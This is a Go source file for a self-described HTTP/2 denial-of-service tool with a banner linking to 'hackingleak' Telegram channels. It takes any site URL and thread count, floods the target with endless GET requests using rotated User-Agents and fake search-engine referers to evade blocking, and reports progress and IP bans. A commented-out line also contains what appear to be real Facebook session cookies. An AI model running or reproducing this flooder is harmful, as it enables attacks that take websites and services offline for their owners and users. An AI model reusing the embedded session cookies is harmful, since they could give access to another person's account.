package main

import (
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
//	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"time"
	"golang.org/x/net/http2"
)

var UAList = GetUAList()

func main() {
	
	var MaxThreads_, SiteURL string
	var MaxThreads int
	fmt.Printf("                ╦ ╦╔╦╗╔╦╗╔═╗  ╔╦╗╦ ╦╔═╗╦═╗\n")
	fmt.Printf("                ╠═╣ ║  ║ ╠═╝   ║ ╠═╣║ ║╠╦╝\n")
	fmt.Printf("                ╩ ╩ ╩  ╩ ╩     ╩ ╩ ╩╚═╝╩╚═\n")
	fmt.Printf("╔═════════╩═════════════════════════════════╩═════════╗\n")
	fmt.Printf("║      HTTP2 DOS TOOL GREAT BY CUTIPU 2023            ║\n")
	fmt.Printf("║      HACKINGLEAK: https://t.me/hackingleak          ║\n")
	fmt.Printf("║             DEV : https://t.me/rebychubx            ║\n")
	fmt.Printf("╚═════════════════════════════════════════════════════╝\n")
	fmt.Printf("Enter URL of site: ")
	fmt.Scanln(&SiteURL)
	if !strings.HasPrefix(SiteURL, "http") {
		SiteURL = "http://" + SiteURL
	}
	fmt.Printf("Enter number of threads: ")
	fmt.Scanln(&MaxThreads_)
	MaxThreads, _ = strconv.Atoi(MaxThreads_)

	if runtime.GOOS == "windows" {
		exec.Command("cls").Run()
	} else {
		exec.Command("clear").Run()
	}

	fmt.Println("Initializing...")
	var ReqCount, OldCount, RetryCount, FailCount int
	var ReqStatus string
	limiter := make(chan int, MaxThreads)
	client := &http.Client{Timeout: time.Second * time.Duration(5)}

	// Use http2.Transport
	tr := &http2.Transport{}
	client.Transport = tr
	fmt.Printf("╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗\n")
	fmt.Printf("╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║║\n")
	fmt.Printf("╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝═╩╝\n\r")
	fmt.Printf("Starting with %d threads...\n", MaxThreads)

	go func() {
		for {
			time.Sleep(time.Second * 5)
			if RetryCount == 5 {
				fmt.Println("\nRetry limit reached, Exiting...")
				continue
		//		os.Exit(0)
			}
			if ReqCount == OldCount {
				fmt.Println("\nNo new requests, Maybe site down ")
				RetryCount++
				continue
			}
			fmt.Printf("\rSent: %d | Failed: %d | Status: %s", ReqCount, FailCount, ReqStatus)
			OldCount = ReqCount
		}
	}()

	go func() {
		req, _ := http.NewRequest("GET", SiteURL, nil)
		PrepareHeaders(req)
		resp, err := client.Do(req)
		if err != nil {
			fmt.Printf("\nError: %v\n", err)
			return
		//	os.Exit(1)
		}
		defer resp.Body.Close()
		ReqStatus = resp.Status
	}()

	for {
		limiter <- 1
		go func() {
			req, _ := http.NewRequest("GET", SiteURL, nil)
			PrepareHeaders(req)
			resp, err := client.Do(req)
			if err != nil {
				FailCount++
				return
			}
			defer resp.Body.Close()
			if resp.StatusCode == 403 {
				fmt.Println("\n403 Forbidden: Maybe IP Banned!")
				return
		//		os.Exit(1)
			} else if resp.StatusCode == 503 {
				fmt.Println("\n503 Service Unavailable")
				return
		//		os.Exit(1)
			}
			ReqCount++
			<-limiter
		}()
	}
}

func PrepareHeaders(req *http.Request) {
	rand.Seed(time.Now().UnixNano())
	charsetList := []string{"utf-8", "*"}
	refererList := []string{"https://google.com/", "https://bing.com/", "https://search.yahoo.com/", "https://duckduckgo.com/", "https://startpage.com/"}
	contenttypeList := []string{"application/x-www-form-urlencoded", "text/html", "text/plain", "text/xml", "*/*"}
	uA := UAList[rand.Intn(len(UAList))]
	req.Header.Set("User-Agent", strings.TrimSuffix(uA, "\r"))
	req.Header.Set("Cache-Control", "no-cache, max-age=0")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Connection", "keep-alive")
//	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36")
//	req.Header.Set("Cookie", "sb=CdvxYwajCy0GcGizHSxJOQRs;datr=K9zxY8PxW4YllaXJL68aj3-7;locale=vi_VN;c_user=100008586575545;wd=1920x929;usida=eyJ2ZXIiOjEsImlkIjoiQXJxbzAwdHh3MDB5bCIsInRpbWUiOjE2NzczNzcwNjJ9;xs=11%3Am3P84HznHHRFuw%3A2%3A1676813348%3A-1%3A6325%3A%3AAcWtVakLmq7t1MIdpTcTS33WRr37oouhnUx03nq4we0;fr=0RVMcAZo1kSWfTIM4.AWWI9OF0KRI0Q-iiUKrMlG37AsE.Bj-uAy.Ef.AAA.0.0.Bj-uAy.AWX43S3tMdg;presence=C%7B%22t3%22%3A%5B%5D%2C%22utc3%22%3A1677385987745%2C%22v%22%3A1%7D;")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(1000)))
	req.Header.Set("Accept-Charset", charsetList[rand.Intn(len(charsetList))])
	req.Header.Set("Referer", refererList[rand.Intn(len(refererList))])
	req.Header.Set("Content-Type", contenttypeList[rand.Intn(len(contenttypeList))])
}

func GetUAList() []string {
	ua, _ := ioutil.ReadFile("ua.txt")
	return strings.Split(string(ua), "\n")
}